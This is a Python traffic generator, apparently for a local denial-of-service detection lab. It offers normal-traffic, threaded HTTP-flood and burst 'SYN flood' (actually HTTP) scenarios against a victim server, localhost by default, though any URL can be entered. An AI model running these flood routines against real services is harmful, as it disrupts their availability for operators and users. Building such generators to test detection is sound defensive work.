"""
traffic_loader.py
Interactive traffic generator that targets victim.py (http://localhost:8000).
Generates Normal, HTTP Flood, and SYN Flood scenarios by issuing many HTTP requests.
"""

import requests
import time
import random
import threading
from datetime import datetime
import urllib.parse

class TrafficGenerator:
    def __init__(self, target_url="http://localhost:8000"):
        self.target_url = target_url.rstrip('/')
        self.running = False

    def _get_endpoint(self, path="/", timeout=2):
        url = f"{self.target_url}{path}"
        try:
            return requests.get(url, timeout=timeout)
        except Exception:
            return None

    def generate_normal_traffic(self, duration=30, rate=5):
        """
        Normal traffic: modest request rate (rate requests/sec).
        """
        print(f"[*] NORMAL traffic: {rate} req/s for {duration}s -> {self.target_url}")
        end = time.time() + duration
        count = 0
        self.running = True
        while time.time() < end and self.running:
            self._get_endpoint(path="/")
            count += 1
            time.sleep(max(0, 1.0 / max(1, rate)))
        self.running = False
        print(f"[✓] Normal traffic done ({count} requests)")

    def generate_http_flood(self, duration=20, rate=1000, threads_count=10):
        """
        HTTP flood: many concurrent threads issuing requests to victim.
        rate = approximate total requests per second to attempt (best-effort).
        """
        print(f"[!] HTTP FLOOD: target={self.target_url} rate≈{rate}/s duration={duration}s threads={threads_count}")
        end = time.time() + duration
        counter = {'count': 0}
        lock = threading.Lock()
        per_thread_rate = max(1, rate // max(1, threads_count))
        sleep_interval = 1.0 / per_thread_rate

        def worker():
            nonlocal end
            while time.time() < end and self.running:
                try:
                    self._get_endpoint(path="/")
                    with lock:
                        counter['count'] += 1
                except:
                    pass
                time.sleep(sleep_interval)

        self.running = True
        threads = []
        for _ in range(max(1, threads_count)):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)

        # monitor
        while time.time() < end and self.running:
            time.sleep(2)

        self.running = False
        for t in threads:
            t.join(timeout=1)

        print(f"[✓] HTTP flood complete ({counter['count']} requests sent)")

    def generate_syn_flood(self, duration=20, bursts=50, burst_size=200):
        """
        Simulated SYN flood: generate short bursts of requests to emulate spikes.
        (Still HTTP requests — victim synthesizes syn_count from observed rate)
        """
        print(f"[!] SYN FLOOD (simulated bursts) -> {self.target_url}")
        self.running = True
        sent = 0
        for _ in range(bursts):
            if not self.running:
                break
            threads = []
            for _ in range(burst_size):
                t = threading.Thread(target=self._get_endpoint, kwargs={'path': '/'})
                t.daemon = True
                t.start()
                threads.append(t)
                sent += 1
            # short pause between bursts
            time.sleep(0.02)
        self.running = False
        print(f"[✓] SYN flood (simulated) complete - approx {sent} requests spawned")

def is_valid_url(u):
    try:
        p = urllib.parse.urlparse(u)
        return p.scheme in ("http", "https") and bool(p.netloc)
    except:
        return False

def choose_input(prompt, default=None, cast=str):
    raw = input(f"{prompt} " + (f"[default: {default}]: " if default is not None else ": "))
    if raw.strip() == "" and default is not None:
        return default
    try:
        return cast(raw)
    except:
        return raw

def main():
    print("="*60)
    print("Traffic Loader -> targets victim at http://localhost:8000")
    print("="*60)

    target = input("Enter victim URL [default: http://localhost:8000]: ").strip()
    if target == "":
        target = "http://localhost:8000"
    if not is_valid_url(target):
        print("Invalid URL — exiting.")
        return

    print("\nScenarios:")
    print(" 1. Normal Traffic")
    print(" 2. HTTP Flood")
    print(" 3. SYN Flood (simulated bursts)")
    print(" 4. Mixed (Normal -> HTTP Flood)")

    scenario = choose_input("Choose scenario (1-4)", default="1", cast=int)
    duration = choose_input("Duration seconds (default 30)", default=30, cast=int)
    rate = choose_input("Rate (approx total req/s for HTTP flood, default 1000)", default=1000, cast=int)
    threads_cnt = choose_input("Threads for HTTP flood (default 10)", default=10, cast=int)

    gen = TrafficGenerator(target_url=target)

    try:
        if scenario == 1:
            gen.generate_normal_traffic(duration=duration, rate=max(1, rate//200))
        elif scenario == 2:
            gen.generate_http_flood(duration=duration, rate=rate, threads_count=threads_cnt)
        elif scenario == 3:
            gen.generate_syn_flood(duration=duration, bursts=duration, burst_size=max(50, rate//10))
        elif scenario == 4:
            gen.generate_normal_traffic(duration=max(5, duration//3), rate=max(1, rate//200))
            time.sleep(1)
            gen.generate_http_flood(duration=max(5, duration//2), rate=rate, threads_count=threads_cnt)
        else:
            print("Unknown scenario.")
    except KeyboardInterrupt:
        print("[!] Interrupted. Stopping.")
        gen.running = False

    print("="*60)
    print("Done")

if __name__ == "__main__":
    main()
